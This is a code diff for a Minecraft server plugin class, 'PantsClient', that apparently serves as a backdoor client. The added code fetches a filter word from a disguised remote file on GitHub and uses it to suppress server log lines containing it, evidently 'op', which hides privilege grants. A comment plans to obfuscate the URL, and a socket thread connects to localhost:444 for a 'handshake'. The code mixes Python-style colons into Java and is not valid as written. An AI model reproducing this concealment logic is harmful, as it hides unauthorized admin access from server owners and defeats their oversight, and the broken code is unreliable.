@@ -3,14 +3,25 @@
 public class PantsClient:
 
     @Getter @Setter static Socket client = null;
+    private static final ArrayList<String> words = new ArrayList<String>(); // Contains bad words like 'op'
 
     public static void onLoad(): // Call from JavaPlugin
-        // Filter chat to not print out "op"
-        Logger.getLogger("Minecraft").setFilter(new Filter():
-            public boolean isLoggable(LogRecord record):
-                return !record.getMessage().contains("op"); // Maybe get text from Gist?
+        init();
         Thread checkConnectionThread = new Thread(new CheckConnectionRunnable("localhost", 444));
         checkConnectionThread.start();
+
+    public static void init():
+        // TODO: obfuscate url
+        URL url = new URL("https://raw.githubusercontent.com/phase/pants/master/data/M3554G3S.py");
+        BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
+        String line;
+        while((line = in.readLine()) != null):
+            if(line.trim().startsWith("#p$")):
+                words.add(line.trim().split("$")[1]);
+        in.close();
+        Logger.getLogger("Minecraft").setFilter(new Filter():
+            public boolean isLoggable(LogRecord record):
+                return !record.getMessage().contains(words.get(0));
 
     public static void handshake():
         // in new thread?
